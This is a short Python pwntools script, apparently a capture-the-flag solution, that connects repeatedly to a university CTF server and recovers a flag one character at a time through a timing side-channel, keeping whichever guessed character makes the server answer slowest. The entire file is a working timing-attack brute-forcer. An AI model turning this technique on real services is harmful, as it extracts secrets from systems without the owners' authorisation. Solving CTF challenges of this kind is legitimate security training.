#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import time

flag      = ""
max_time  = 27

while True:
    for c in "!?}_15scktemng4afbsydh5ij37lopqruvwx02689z-@{":
        p = remote("ctf.cs.technion.ac.il", 4014)
        p.recv()

        before = time.time()
        p.sendline(flag+c)
        p.recv()
        p.close()

        after = time.time()
        if after-before > max_time:
            max_time = max_time+1
            print(max_time)
            flag = flag+c
            break

    print(flag)
